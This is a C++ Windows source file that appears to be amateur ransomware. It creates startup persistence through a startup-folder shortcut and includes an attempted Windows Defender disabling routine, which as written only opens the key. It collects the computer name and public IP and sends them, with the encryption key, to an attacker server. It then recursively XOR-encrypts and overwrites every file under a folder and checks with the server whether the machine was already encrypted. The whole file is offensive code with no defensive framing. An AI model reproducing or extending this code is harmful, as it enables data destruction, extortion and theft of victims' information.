#include "gg.h"
#include <vector>
#include <map>
#include <stdlib.h>



uint32_t FULL_NUM_FOR_FILE_HANDLE = 0;

bool IsAdministrator(HRESULT& rHr)
{
    bool bIsAdmin = false;

    try
    {
        ATL::CAccessToken aToken;
        if (!aToken.GetProcessToken(TOKEN_QUERY))
        {
            throw MAKE_SCODE(SEVERITY_ERROR, FACILITY_WIN32, ::GetLastError());
        }

        ATL::CTokenGroups groups;
        if (!aToken.GetGroups(&groups))
        {
            throw MAKE_SCODE(SEVERITY_ERROR, FACILITY_WIN32, ::GetLastError());
        }

        ATL::CSid::CSidArray groupSids;
        ATL::CAtlArray<DWORD> groupAttribs;
        groups.GetSidsAndAttributes(&groupSids, &groupAttribs);
        for (uint32_t i = 0; !bIsAdmin && i < groupSids.GetCount(); i++)
        {
            bIsAdmin = groupSids.GetAt(i) == ATL::Sids::Admins();
        }
        rHr = S_OK;
    }
    catch (HRESULT hr)
    {
        rHr = hr;
    }

    return bIsAdmin;
}

bool add_to_startup(std::string& path)
{
    WCHAR startupFolderPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupFolderPath)))
    {
        std::wstring shortcutPath = std::wstring(startupFolderPath) + L"\\startup.lnk";

        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED); // Change to COINIT_MULTITHREADED
        if (FAILED(hr))
        {
            std::cerr << "Failed to initialize COM library." << std::endl;
            return false;
        }

        CComPtr<IShellLinkW> pShellLink;
        hr = pShellLink.CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER);
        if (FAILED(hr))
        {
            std::cerr << "Failed to create a shell link." << std::endl;
            CoUninitialize(); // Uninitialize COM before returning
            return false;
        }

        std::wstring widePath = std::wstring(path.begin(), path.end());
        pShellLink->SetPath(widePath.c_str());

        CComPtr<IPersistFile> pPersistFile;
        hr = pShellLink.QueryInterface(&pPersistFile);
        if (FAILED(hr))
        {
            std::cerr << "Failed to query IPersistFile interface." << std::endl;
            CoUninitialize(); // Uninitialize COM before returning
            return false;
        }

        hr = pPersistFile->Save(shortcutPath.c_str(), TRUE);
        if (FAILED(hr))
        {
            std::cerr << "Failed to save the shortcut." << std::endl;
            CoUninitialize(); // Uninitialize COM before returning
            return false;
        }

        CoUninitialize(); // Ensure COM is uninitialized
        return true;
    }
    else
    {
        std::cerr << "Failed to get the startup folder path." << std::endl;
        return false;
    }
}


// Example function to get the path of the current executable
std::string get_this_file_path()
{
    // Allocate a buffer for the wide string
    WCHAR path[MAX_PATH];
    DWORD length = GetModuleFileName(NULL, path, MAX_PATH);
    int size_needed = WideCharToMultiByte(CP_ACP, 0, path, length, NULL, 0, NULL, NULL);
    std::string result(size_needed, 0);
    WideCharToMultiByte(CP_ACP, 0, path, length, &result[0], size_needed, NULL, NULL);

    return result;
}

bool open_camera_app()
{
    const std::string camara_commend = "start microsoft.windows.camera:";
    int result = std::system(camara_commend.c_str());
	return result == 0;
}
// -----------------------------------------------------------------------------------
bool disable_defender() // dosent work for production!!!!!!
// -----------------------------------------------------------------------------------
{
    HKEY hkey = NULL;
    // Open the registry key for Windows Defender
    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &hkey);

    if (result == ERROR_SUCCESS) 
    {
        // Set the value of DisableAntiSpyware to 1 to disable Windows Defender
        result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &hkey);

        if (result == ERROR_SUCCESS) 
        {
            std::cout << "Windows Defender disabled successfully." << std::endl;
            RegCloseKey(hkey);
            return true;
        }
        else 
        {
            std::cout << "Failed to disable Windows Defender." << std::endl;
            RegCloseKey(hkey);
            return false;
        }
    }
    else 
    {
        std::cout << "Failed to open the registry key." << std::endl;
        return false;
    }
}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::string get_file_folder(std::string file_path)
{
    return file_path.substr(0, file_path.find_last_of("\\/"));
}

int get_encryption_key()
{
    std::srand(std::time(nullptr));
    return std::rand() % (MAX_RANDOM_NUMBER - MIN_RANDOM_NUMBER + 1) + MIN_RANDOM_NUMBER;
}

std::string fetch_computer_name()
{
    // Allocate a buffer for the computer name
    WCHAR computer_name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;

    // Get the computer name
    if (GetComputerNameW(computer_name, &size))
    {
        // Convert the wide string to a narrow string (std::string)
        int bufferSize = WideCharToMultiByte(CP_UTF8, 0, computer_name, -1, NULL, 0, NULL, NULL);
        std::string computerNameStr(bufferSize, 0);
        WideCharToMultiByte(CP_UTF8, 0, computer_name, -1, &computerNameStr[0], bufferSize, NULL, NULL);

        return computerNameStr;
    }
    else
    {
        return "Unknown";
    }
}

std::string fetch_ip_address()
{
    LPCWSTR hostname = L"IP retriever";
    LPCWSTR domain = L"http://myexternalip.com/raw";

    HINTERNET net = InternetOpen(hostname, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!net)
    {
        std::cerr << "Failed to initialize WinINet." << std::endl;
        return "Error";
    }

    HINTERNET conn = InternetOpenUrl(net, domain, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!conn)
    {
        std::cerr << "Failed to open URL." << std::endl;
        InternetCloseHandle(net); // Properly close handle
        return "Error";
    }

    char buffer[4096];
    DWORD bytesRead = 0;
    std::string result;

    if (InternetReadFile(conn, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0)
    {
        buffer[bytesRead] = '\0';  // Null-terminate the buffer
        result = std::string(buffer);
    }
    else
    {
        std::cerr << "Failed to read from URL." << std::endl;
        result = "Error";
    }

    InternetCloseHandle(conn); // Close handle after reading
    InternetCloseHandle(net);  // Close handle after reading
    return result;
}

SOCKET connect_to_server()
{
    WSADATA wsaData;
    int wserr;
    WORD wVersionRequested = MAKEWORD(2, 2);
    wserr = WSAStartup(wVersionRequested, &wsaData);

    SOCKET clientSocket;
    clientSocket = INVALID_SOCKET;
    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (clientSocket == INVALID_SOCKET)
    {
        WSACleanup();
		return -1;
    }
	sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	clientService.sin_addr.s_addr = inet_addr(SERVER_ADDRESS);
	clientService.sin_port = htons(SERVER_PORT);
    if (connect(clientSocket, reinterpret_cast<SOCKADDR*>(&clientService), sizeof(clientService)) == SOCKET_ERROR)
    {
        WSACleanup();
        return -1;
    }
	return clientSocket;
}

bool send_data_to_server(SOCKET clientSocket, int key, __userDetils__ userDetails)
{
	std::string data = conccet_ip_and_computer_name(key, &userDetails);
    int result = send(clientSocket, data.c_str(), data.length(), 0);

    if (result == SOCKET_ERROR) 
    {
        return false;
    }
    return true;
}
void saveStrucetInFile(__userDetils__ user_details)
{
    std::ofstream file("user_details.txt");
    if (!file.is_open())
    {
        std::cerr << "Failed to open the file." << std::endl;
        return;
    }
    else
    {
        std::cout << "Writing\n";
    }
    
    FULL_NUM_FOR_FILE_HANDLE++;

    // Formatting the structure into a string
    file << "__userDetails__ " << FULL_NUM_FOR_FILE_HANDLE << "\n{\n";
    file << "\tstd::string ComputerName: " << user_details.ComputerName << ";\n";
    file << "\tstd::string UserIP: " << user_details.UserIP << ";\n";
    file << "\tuint32_t key: " << user_details.key << ";\n";
    file << "}__userDetails__;\n";

    file.close();
}

std::string conccet_ip_and_computer_name(size_t public_key, __userDetils__* user_detail)
{
    std::string public_ip = fetch_ip_address();
    std::string computer_name = fetch_computer_name();
    std::string key_str = std::to_string(public_key);

    // Access members using the arrow operator
    user_detail->UserIP = public_ip;
    user_detail->ComputerName = computer_name;
    user_detail->key = public_key;

    //saveStrucetInFile(*user_detail);  // Corrected the function name

    return computer_name + "," + public_ip + "," + key_str;
}

bool get_file_folders(int key, std::string folder_path, std::string start, int mode)
{
    namespace fs = std::filesystem;
    try
    {
        if (!fs::is_directory(folder_path))
        {
            std::cerr << "Path is not a directory: " << folder_path << std::endl;
            return false;
        }

        for (auto& entry : fs::directory_iterator(folder_path, fs::directory_options::skip_permission_denied))
        {
            const std::string file_path = entry.path().string();

            // Check if the current entry is a directory
            if (fs::is_directory(entry.status()))
            {
                std::cout << "Entering folder: " << file_path << std::endl;
                get_file_folders(key, file_path, start + "\t", mode);  // Recursive call
            }
            else
            {
                std::cout << "Processing file: " << file_path << std::endl;

                if (mode == 1)
                {
                    if (!EN_DEcrypt_file_folders(key, file_path))
                    {
                        std::cerr << "Failed to encrypt/decrypt file: " << file_path << std::endl;
                    }
                }
            }
        }
    }
    catch (const fs::filesystem_error& error)
    {
        std::cerr << "Filesystem error: " << error.what() << " at: " << folder_path << std::endl;
        return false;
    }
    catch (const std::exception& error)
    {
        std::cerr << "General error: " << error.what() << " at: " << folder_path << std::endl;
        return false;
    }

    return true;
}


bool EN_DEcrypt_file_folders(int key, std::string file_path)
{
    char KEY = (char)key;
    std::ifstream file(file_path); // Input file stream to read the file
    std::string toEncrypt = "";
    std::string encrypted = "";

    std::string line;
    if (file.is_open())
    {
        while (std::getline(file, line))
        {
            toEncrypt += line; // Read the entire file content
        }
        file.close(); // Close the file after reading
    }
    else
    {
        std::cerr << "Unable to open file for reading: " << file_path << std::endl;
        return false;
    }

    // Encrypting the file content
    int count = 0;
    for (auto c : toEncrypt)
    {
        count++;
        encrypted += (char)(c ^ KEY);
        if (count % 50 == 0)
        {
            encrypted += "\n"; 
        }
    }

    std::ofstream outFile(file_path, std::ios::trunc); 
    if (outFile.is_open())
    {
        outFile << encrypted;
        outFile.close();
    }
    else
    {
        std::cerr << "Unable to open file for writing: " << file_path << std::endl;
        return false;
    }

    return true;
}

bool check_for_exe_file(std::string file_name)
{
    return file_name.find(".exe") != std::string::npos;
}

bool find_folder(std::string file_name)
{
	return file_name.find(".") == std::string::npos;
}

void printStructure(__userDetils__ userDetils)
{
    std::cout << "__userDetails__\n{\n";
    std::cout << "\tstd::string ComputerName: " << userDetils.ComputerName << ";\n";
    std::cout << "\tstd::string UserIP: " << userDetils.UserIP << ";\n";
    std::cout << "\tuint32_t key: " << userDetils.key << ";\n";
    std::cout << "}__userDetails__;\n";
}

bool alreadyEncrypted(SOCKET socket, __userDetils__ userDetails)
{
    std::string data = conccet_ip_and_computer_name(userDetails.key, &userDetails);
    int result = send(socket, data.c_str(), data.length(), 0);
    
    if (result == SOCKET_ERROR)
    {
        return true; // If there's a socket error, return true (assuming already encrypted).
    }

    // Buffer to receive response from the socket
    char buffer[1024];
    result = recv(socket, buffer, sizeof(buffer), 0);

    if (result > 0)
    {
        // Process the response received from the server
        std::string response(buffer, result);

        // Check the response content
        if (response == "ALREADY_ENCRYPTED")
        {
            return true; // If the response indicates encryption, return true
        }
    }
    else if (result == 0)
    {
        // Connection closed
        std::cerr << "Connection closed by the server." << std::endl;
    }
    else
    {
        // Receiving error
        std::cerr << "recv failed: " << WSAGetLastError() << std::endl;
    }

    return false;
}
